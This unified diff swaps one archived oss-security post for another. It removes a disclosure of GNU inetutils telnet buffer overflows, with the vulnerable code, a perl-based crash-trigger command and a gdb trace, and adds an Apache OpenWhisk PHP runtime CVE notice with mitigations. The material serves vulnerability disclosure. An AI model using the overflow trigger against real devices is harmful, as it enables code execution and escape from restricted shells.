@@ -1,129 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/11/1
-Message-ID: <CAG-OieOVQkON9yTYJcKuKGfP5XK5zitz0nTr9+ci71mTZrz-+A@mail.gmail.com>
-Date: Tue, 11 Dec 2018 10:39:36 -0800
-From: Hacker Fantastic <hackerfantastic@...glemail.com>
-To: oss-security@...ts.openwall.com
-Subject: Multiple telnet.c overflows
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/07/20/5
+Message-ID: <CAAC1_d4geVGr-+Ok95Gq9C9P81BXUDT3d9N7-2r+qsiPrM5r3w@mail.gmail.com>
+Date: Fri, 20 Jul 2018 18:05:03 +0000
+From: Rodric Rabbah <rabbah@...che.org>
+To: Apache Security Team <security@...che.org>, oss-security@...ts.openwall.com,  announce@...che.org, dev@...nwhisk.apache.org
+Cc: Ory Segal <ory@...esec.io>
+Subject: [CVE] CVE-2018-11756 PHP Runtime for Apache OpenWhisk
 Content-Type: text/plain; charset=utf-8
 
-Original advisory is here -
-https://hacker.house/releasez/expl0itz/inetutils-telnet.txt
+Who is Affected: Apache OpenWhisk users with an explicitly created Docker
+action, and the Docker image used for the action inherits from the affected
+Docker tags:
+- openwhisk/action-php-v7.2 < 1.0.1
+- openwhisk/action-php-v7.1 < 1.0.2
 
-GNU inetutils <= 1.9.4 telnet.c multiple overflows
-==================================================
-GNU inetutils is vulnerable to a stack overflow vulnerability in the
-client-side environment
-variable handling which can be exploited to escape restricted shells
-on embedded devices.
-Most modern browsers no longer support telnet:// handlers, but in
-instances where URI
-handlers are enabled to the inetutils telnet client this issue maybe
-remotely triggerable.
-A stack-based overflow is present in the handling of environment
-variables when connecting
-telnet.c to remote telnet servers through oversized DISPLAY arguments.
+The PHP Runtime does not currently have any Apache releases.
 
-A heap-overflow is also present which can be triggered in a different
-code path due to
-supplying oversized environment variables during client connection code.
+Description: A Docker action running as a serverless function (e.g., wsk
+action create <name> —docker <image>), where the Dockerfile used to create
+the Docker image inherits one of the affected tags, may allow a carefully
+crafted parameter to overwrite the serverless function running inside the
+container. This requires the user included function to be vulnerable in
+some way, for example via parameter hijacking, remote code execution, or
+unsafe use of “eval()”. Subsequent executions of the original function in
+the same container will use the replaced implementation if the function was
+successfully exploited.
 
-The stack-based overflow can be seen in the following code snippet
-from the latest inetutils
-release dated 2015.
+Mitigation: Users that create their own Docker runtimes to run as Apache
+OpenWhisk Docker actions, and who pin their Docker runtime image (e.g.,
+Dockerfile starts with “FROM openwhisk/action-php-v7.2:1.0.0”) should
+upgrade their Docker tag to the latest available tag. Users who build from
+source, should use the latest commit Git tag [1]. Operators of an Apache
+OpenWhisk deployment should check their runtime manifest to determine if
+they are affected, and if so, upgrade the tags in their runtimes manifest
+to automatically patch all actions runtimes when updating their deployment.
 
-inetutils-telnet/inetutils-1.9.4/telnet/telnet.c
+Credit: This issue was discovered while investigating a related issue
+researched and reported by Yuri Shapira and Ory Segal of PureSec.
 
-983-    case TELOPT_XDISPLOC:
-984-      if (my_want_state_is_wont (TELOPT_XDISPLOC))
-985-	return;
-986-      if (SB_EOF ())
-987-	return;
-988-      if (SB_GET () == TELQUAL_SEND)
-989-	{
-990-	  unsigned char temp[50], *dp;
-991-	  int len;
-992-
-993-	  if ((dp = env_getvalue ("DISPLAY")) == NULL)
-994-	    {
-995-	      /*
-996-	       * Something happened, we no longer have a DISPLAY
-997-	       * variable.  So, turn off the option.
-998-	       */
-999-	      send_wont (TELOPT_XDISPLOC, 1);
-1000-	      break;
-1001-	    }
-1002:	  sprintf ((char *) temp, "%c%c%c%c%s%c%c", IAC, SB, TELOPT_XDISPLOC,
-1003-		   TELQUAL_IS, dp, IAC, SE);
-1004-	  len = strlen ((char *) temp + 4) + 4;	/* temp[3] is 0 ... */
-1005-
-1006-	  if (len < NETROOM ())
-
-When a telnet server requests environment options the sprintf on line 1002 will
-not perform bounds checking and causes an overflow of stack buffer
-temp[50] defined
-at line 990. This issue can be trivially fixed using a patch to add
-bounds checking
-to sprintf such as with a call to snprintf();
-
-An example of the heap overflow can be seen when handling large environment
-variables within the telnet client, causing heap buffer memory corruption
-when handling large environment variables supplied through examples USER or
-DISPLAY. An example of triggering this issue on inetutils in Arch Linux can be
-seen below:
-
-DISPLAY=`perl -e 'print Ax"50000"'` telnet -l`perl -e 'print
-"A"x5000'` 192.168.69.1
-Trying 192.168.69.1...
-Connected to 192.168.69.1.
-Escape character is '^]'.
-realloc(): invalid next size
-Aborted (core dumped)
-
-These issues are present anywhere that inetutils is used as a base for clients
-such as in common embedded home routers or networking equipment. An attacker
-can potentially exploit these vulnerabilities to gain arbitrary code execution
-on platforms where telnet commands are available. An example debug trace of the
-heap overflow can be found below:
-
-(gdb) run -l`perl -e 'print "A"x5000'` 192.168.69.1
-Starting program: /usr/bin/telnet -l`perl -e 'print "A"x5000'` 192.168.69.1
-Trying 192.168.69.1...
-Connected to 192.168.69.1.
-Escape character is '^]'.
-realloc(): invalid next size
-
-Program received signal SIGABRT, Aborted.
-0x00007ffff7d87d7f in raise () from /usr/lib/libc.so.6
-(gdb) bt
-#0  0x00007ffff7d87d7f in raise () from /usr/lib/libc.so.6
-#1  0x00007ffff7d72672 in abort () from /usr/lib/libc.so.6
-#2  0x00007ffff7dca878 in __libc_message () from /usr/lib/libc.so.6
-#3  0x00007ffff7dd118a in malloc_printerr () from /usr/lib/libc.so.6
-#4  0x00007ffff7dd52ac in _int_realloc () from /usr/lib/libc.so.6
-#5  0x00007ffff7dd62df in realloc () from /usr/lib/libc.so.6
-#6  0x000055555556029c in ?? ()
-#7  0x0000555555560116 in ?? ()
-#8  0x000055555556049f in ?? ()
-#9  0x00005555555606b7 in ?? ()
-#10 0x00005555555616de in ?? ()
-#11 0x0000555555561b8d in ?? ()
-#12 0x0000555555562122 in ?? ()
-#13 0x000055555555c6f4 in ?? ()
-#14 0x00005555555591e7 in ?? ()
-#15 0x00007ffff7d74223 in __libc_start_main () from /usr/lib/libc.so.6
-#16 0x00005555555592be in ?? ()
-
-Due to the various devices embedding telnet from inetutils and distributions
-such as Arch Linux using inetutils telnet, it is unclear the full impact and all
-scenarios where this issue could be leveraged. An attacker may seek to exploit
-these vulnerabilities to escape restricted shells.
-
--- Hacker Fantastic (11/12/2018)
-https://hacker.house
-
-
--- 
-Hacker Fantastic
-https://hacker.house
+[1]
+https://github.com/apache/incubator-openwhisk-runtime-php/commit/6caf902f527250ee4b7b695929b628d560e0dad1
 
